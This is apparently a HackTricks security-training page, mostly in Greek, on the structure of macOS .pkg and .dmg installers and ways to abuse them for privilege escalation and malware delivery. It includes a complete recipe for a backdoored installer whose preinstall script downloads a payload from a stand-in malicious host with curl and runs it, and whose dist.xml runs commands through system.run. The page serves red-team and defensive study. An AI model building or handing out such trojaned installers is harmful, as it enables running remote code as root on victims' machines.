# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Ένα **πακέτο εγκατάστασης** macOS (γνωστό και ως αρχείο `.pkg`) είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS για να **διανέμει λογισμικό**. Αυτά τα αρχεία είναι σαν ένα **κουτί που περιέχει τα πάντα που χρειάζεται ένα κομμάτι λογισμικού** για να εγκατασταθεί και να λειτουργήσει σωστά.

Το αρχείο πακέτου είναι ένα αρχείο που περιέχει μια **ιεραρχία αρχείων και καταλόγων που θα εγκατασταθούν στον στόχο** υπολογιστή. Μπορεί επίσης να περιλαμβάνει **σενάρια** για την εκτέλεση εργασιών πριν και μετά την εγκατάσταση, όπως η ρύθμιση αρχείων διαμόρφωσης ή η καθαριότητα παλαιών εκδόσεων του λογισμικού.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Προσαρμογές (τίτλος, κείμενο καλωσορίσματος…) και έλεγχοι σεναρίων/εγκατάστασης
- **PackageInfo (xml)**: Πληροφορίες, απαιτήσεις εγκατάστασης, τοποθεσία εγκατάστασης, διαδρομές προς σενάρια προς εκτέλεση
- **Bill of materials (bom)**: Λίστα αρχείων προς εγκατάσταση, ενημέρωση ή αφαίρεση με δικαιώματα αρχείων
- **Payload (CPIO archive gzip compresses)**: Αρχεία προς εγκατάσταση στην `install-location` από το PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Σενάρια προ και μετά την εγκατάσταση και περισσότερους πόρους που εξάγονται σε έναν προσωρινό κατάλογο για εκτέλεση.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Για να οπτικοποιήσετε τα περιεχόμενα του εγκαταστάτη χωρίς να το αποσυμπιέσετε χειροκίνητα, μπορείτε επίσης να χρησιμοποιήσετε το δωρεάν εργαλείο [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Βασικές Πληροφορίες DMG

Τα αρχεία DMG, ή Apple Disk Images, είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS της Apple για εικόνες δίσκων. Ένα αρχείο DMG είναι ουσιαστικά μια **τοποθετήσιμη εικόνα δίσκου** (περιέχει το δικό του σύστημα αρχείων) που περιέχει ακατέργαστα δεδομένα μπλοκ που συνήθως είναι συμπιεσμένα και μερικές φορές κρυπτογραφημένα. Όταν ανοίγετε ένα αρχείο DMG, το macOS **το τοποθετεί σαν να ήταν φυσικός δίσκος**, επιτρέποντάς σας να έχετε πρόσβαση στα περιεχόμενά του.

> [!CAUTION]
> Σημειώστε ότι οι εγκαταστάτες **`.dmg`** υποστηρίζουν **τόσες πολλές μορφές** που στο παρελθόν μερικές από αυτές που περιείχαν ευπάθειες χρησιμοποιήθηκαν για να αποκτήσουν **εκτέλεση κώδικα πυρήνα**.

### Ιεραρχία

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Η ιεραρχία ενός αρχείου DMG μπορεί να είναι διαφορετική ανάλογα με το περιεχόμενο. Ωστόσο, για τα DMG εφαρμογών, συνήθως ακολουθεί αυτή τη δομή:

- Κορυφαίο Επίπεδο: Αυτό είναι η ρίζα της εικόνας δίσκου. Συνήθως περιέχει την εφαρμογή και πιθανώς έναν σύνδεσμο στον φάκελο Εφαρμογών.
- Εφαρμογή (.app): Αυτή είναι η πραγματική εφαρμογή. Στο macOS, μια εφαρμογή είναι συνήθως ένα πακέτο που περιέχει πολλά μεμονωμένα αρχεία και φακέλους που συνθέτουν την εφαρμογή.
- Σύνδεσμος Εφαρμογών: Αυτός είναι ένας συντομευμένος σύνδεσμος στον φάκελο Εφαρμογών στο macOS. Ο σκοπός αυτού είναι να διευκολύνει την εγκατάσταση της εφαρμογής. Μπορείτε να σύρετε το αρχείο .app σε αυτή τη συντόμευση για να εγκαταστήσετε την εφαρμογή.

## Privesc μέσω κατάχρησης pkg

### Εκτέλεση από δημόσιους καταλόγους

Εάν ένα σενάριο προ ή μετά την εγκατάσταση εκτελείται, για παράδειγμα, από **`/var/tmp/Installerutil`**, και ο επιτιθέμενος μπορούσε να ελέγξει αυτό το σενάριο, θα μπορούσε να κλιμακώσει τα δικαιώματα όποτε εκτελείται. Ή ένα άλλο παρόμοιο παράδειγμα:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Αυτή είναι μια [δημόσια συνάρτηση](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) που θα καλέσουν αρκετοί εγκαταστάτες και ενημερωτές για να **εκτελέσουν κάτι ως root**. Αυτή η συνάρτηση δέχεται το **μονοπάτι** του **αρχείου** που θα **εκτελεστεί** ως παράμετρο, ωστόσο, εάν ένας επιτιθέμενος μπορούσε να **τροποποιήσει** αυτό το αρχείο, θα μπορούσε να **καταχραστεί** την εκτέλεσή του με root για να **κλιμακώσει τα δικαιώματα**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Για περισσότερες πληροφορίες, ελέγξτε αυτή την ομιλία: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Εκτέλεση μέσω προσάρτησης

Εάν ένας εγκαταστάτης γράφει στο `/tmp/fixedname/bla/bla`, είναι δυνατό να **δημιουργηθεί μια προσάρτηση** πάνω από το `/tmp/fixedname` χωρίς ιδιοκτήτες, ώστε να μπορείτε να **τροποποιήσετε οποιοδήποτε αρχείο κατά τη διάρκεια της εγκατάστασης** για να εκμεταλλευτείτε τη διαδικασία εγκατάστασης.

Ένα παράδειγμα αυτού είναι το **CVE-2021-26089** που κατάφερε να **επικαλύψει ένα περιοδικό σενάριο** για να αποκτήσει εκτέλεση ως root. Για περισσότερες πληροφορίες, ρίξτε μια ματιά στην ομιλία: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg ως κακόβουλο λογισμικό

### Κενό Payload

Είναι δυνατόν να δημιουργηθεί απλά ένα **`.pkg`** αρχείο με **προ και μετά την εγκατάσταση σενάρια** χωρίς κανένα πραγματικό payload εκτός από το κακόβουλο λογισμικό μέσα στα σενάρια.

### JS στο Distribution xml

Είναι δυνατόν να προστεθούν **`<script>`** ετικέτες στο **distribution xml** αρχείο του πακέτου και αυτός ο κώδικας θα εκτελείται και μπορεί να **εκτελεί εντολές** χρησιμοποιώντας **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Εγκαταστάτης με πίσω πόρτα

Κακόβουλος εγκαταστάτης που χρησιμοποιεί ένα σενάριο και κώδικα JS μέσα στο dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Αναφορές

- [**DEF CON 27 - Αποσυμπίεση Πακέτων Μια Ματιά Μέσα στα Πακέτα Εγκατάστασης macOS και Κοινές Ασφαλιστικές Αδυναμίες**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Ο Άγριος Κόσμος των Εγκαταστάσεων macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Αποσυμπίεση Πακέτων Μια Ματιά Μέσα στα Πακέτα Εγκατάστασης macOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
